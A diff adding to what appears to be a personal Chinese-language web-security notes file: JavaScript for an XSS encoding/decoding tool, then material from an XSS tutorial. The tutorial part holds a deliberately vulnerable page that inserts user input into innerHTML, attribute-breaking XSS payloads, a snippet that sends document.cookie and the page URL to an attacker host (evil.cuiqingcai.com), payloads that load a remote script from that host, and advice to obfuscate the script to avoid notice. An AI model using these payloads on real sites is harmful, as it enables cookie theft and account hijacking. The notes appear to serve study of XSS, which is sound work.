@@ -1,3 +1,256 @@
+[xss测试编码工具](https://xss.haozi.me/tools/xss-encode/)
+```js
+var encodeObj = document.getElementById("encode");
+var encodeObjResult = document.getElementById("encode_result");
+var decodeObj = document.getElementById("decode");
+var decodeObjResult = document.getElementById("decode_result");
+var dianji = document.getElementsByTagName("button");
+for (var i = 0; i < dianji.length; i++) {
+    dianji[i].onclick = function () {
+        var type = this.getAttribute("leixing");
+        if (type == "jiami") {
+            jiami(this.name);
+        }
+        if (type == "jiemi") {
+            jiemi(this.name)
+        }
+    }
+}
+
+function jiami(s) {
+    //把传入的值 赋给变量 encode
+    var encode = s;
+    //if选择的url编码 则进入url编码 代码块
+    if (encode == "url") {
+        try {
+            encodeObjResult.value = encodeURIComponent(encodeObj.value);
+        }
+        catch (e) {
+            alert(e);
+        }
+    }
+
+    //如果选择的html实体编码十进制
+    if (encode == "html10") {
+        try {
+            var jieguo = "";
+            for (var i = 0; i < encodeObj.value.length; i++) {
+                jieguo += "&#" + encodeObj.value.charCodeAt(i) + ";";
+            }
+            encodeObjResult.value = jieguo;
+        }
+        catch (e) {
+            alert(e);
+        }
+    }
+
+    //如果选择的html实体编码十六进制
+    if (encode == "html16") {
+        try {
+            var jieguo = "";
+            for (var i = 0; i < encodeObj.value.length; i++) {
+                jieguo += "&#x" + encodeObj.value.charCodeAt(i).toString(16) + ";";
+            }
+            encodeObjResult.value = jieguo;
+        }
+        catch (e) {
+            alert(e);
+        }
+    }
+
+    //如果选择的编码是js unicode编码
+    if (encode == "jsunicode") {
+        try {
+            var jieguo = "";
+            for (var i = 0; i < encodeObj.value.length; i++) {
+                jieguo += "\\u00" + encodeObj.value.charCodeAt(i).toString(16);
+            }
+            encodeObjResult.value = jieguo;
+        }
+        catch (e) {
+            alert(e);
+        }
+    }
+
+    //如果选择的是js16进制编码
+    if (encode == "js16") {
+        try {
+            var jieguo = "";
+            for (var i = 0; i < encodeObj.value.length; i++) {
+                jieguo += "\\x" + encodeObj.value.charCodeAt(i).toString(16);
+            }
+            encodeObjResult.value = jieguo;
+        }
+        catch (e) {
+
+            alert(e);
+        }
+    }
+
+    //如果选择的是js8进制编码
+    if (encode == "js8") {
+        try {
+            var jieguo = "";
+            for (var i = 0; i < encodeObj.value.length; i++) {
+                jieguo += "\\" + encodeObj.value.charCodeAt(i).toString(8);
+            }
+            encodeObjResult.value = jieguo;
+        }
+        catch (e) {
+            alert(e);
+        }
+    }
+
+    //如果选择的是base64编码
+    if (encode == "base64") {
+        try {
+            encodeObjResult.value = btoa(encodeObj.value);
+        }
+        catch (e) {
+            alert(e.message);
+        }
+    }
+}
+
+//以上是加密函数
+//以下是解密函数
+
+function jiemi(s) {
+    //创建一个变量接受传过来的解码方式
+    var decode = s;
+    //如果解码方式等于URL
+    if (decode == "url") {
+        try {
+            decodeObjResult.value = decodeURIComponent(decodeObj.value);
+        }
+        catch (e) {
+            alert(e);
+        }
+    }
+
+    //如果解码方式是html实体编码十进制
+    if (decode == "html10") {
+        try {
+            var jieguo = "";
+            var jieguoary = decodeObj.value.split("&#");
+            for (var i = 1; i < jieguoary.length; i++) {
+                jieguo += String.fromCharCode(parseInt(jieguoary[i].replace(';', '')));
+            }
+            decodeObjResult.value = jieguo;
+        }
+        catch (e) {
+            alert(e);
+        }
+    }
+
+    //如果解码方式是html实体编码十六进制
+    if (decode == "html16") {
+        try {
+            var jieguo = "";
+            var jieguoary = decodeObj.value.split("&#x");
+            for (var i = 1; i < jieguoary.length; i++) {
+                jieguo += String.fromCharCode(parseInt(jieguoary[i], 16));
+            }
+            decodeObjResult.value = jieguo;
+        }
+        catch (e) {
+            alert(e);
+        }
+    }
+
+    //如果解码方式是js unicode编码
+    if (decode == "jsunicode") {
+        try {
+            var jieguo = "";
+            var jieguoary = decodeObj.value.split("\\u00");
+            for (var i = 1; i < jieguoary.length; i++) {
+                jieguo += String.fromCharCode(parseInt(jieguoary[i], 16));
+            }
+            decodeObjResult.value = jieguo;
+        }
+        catch (e) {
+            alert(e)
+        }
+    }
+
+    //如果解码方式是js16进制编码
+    if (decode == "js16") {
+        try {
+            var jieguo = "";
+            var jieguoary = decodeObj.value.split("\\x");
+            for (var i = 1; i < jieguoary.length; i++) {
+                jieguo += String.fromCharCode(parseInt(jieguoary[i], 16));
+            }
+            decodeObjResult.value = jieguo;
+        }
+        catch (e) {
+            alert(e);
+        }
+    }
+
+    //如果解码方式是js8进制编码
+    if (decode == "js8") {
+        try {
+            var jieguo = "";
+            var jieguoary = decodeObj.value.split("\\");
+            for (var i = 1; i < jieguoary.length; i++) {
+                jieguo += String.fromCharCode(parseInt(jieguoary[i], 8));
+            }
+            decodeObjResult.value = jieguo;
+        }
+        catch (e) {
+            alert("e");
+        }
+    }
+
+
+    //如果解码方式是base64编码
+    if (decode == "base64") {
+        try {
+            decodeObjResult.value = atob(decodeObj.value);
+        }
+        catch (e) {
+            alert("e");
+        }
+    }
+}
+
+此网站为英文页面, 是否需要翻译?翻译网页鼠标悬停翻译×不再翻译此网站人工翻译
+```
+
+[Web安全学习一之XSS漏洞的利用](http://cuiqingcai.com/3133.html)
+```js
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>TEST XSS</title>
+</head>
+<body>
+    <script>
+        function test() {
+            var text = document.getElementById('text').value;
+            var new_text = '<a href="' + text + '">test</a>';
+            console.log(new_text);
+            document.getElementById('content').innerHTML = new_text;
+        }
+    </script>
+<div id="content"></div>
+<input type="text" id="text" value="">
+<input type="button" id="button" value="提交" onclick="test()">
+</body>
+</html>
+
+javascript:void(0)" onclick=alert('ssss') " "><img src="#" onerror=alert(/xss/)><meta class="
+ 
+var img = document.createElement('img');
+img.src = 'http://evil.cuiqingcai.com/cookie.php?url='+escape(window.location.href)+'&content='+escape(document.cookie);
+img.style = 'display:none';
+document.body.appendChild(img);
+javascript:void(0)"></a><script src="//evil.cuiqingcai.com/cookie.js"></script><a class="
+javascript:void(0)"></a><img src=# onerror="document.body.appendChild(document.createElement('script')).src='//evil.cuiqingcai.com/cookie.js'"><a class="
+为了防止JavaScript被看出来，可以利用在线加密网站加密。http://tool.chinaz.com/js.aspx
+```
+
 
 [redis配置文件redis.conf参数说明](http://coolaf.com/article/80.html)
 ```js
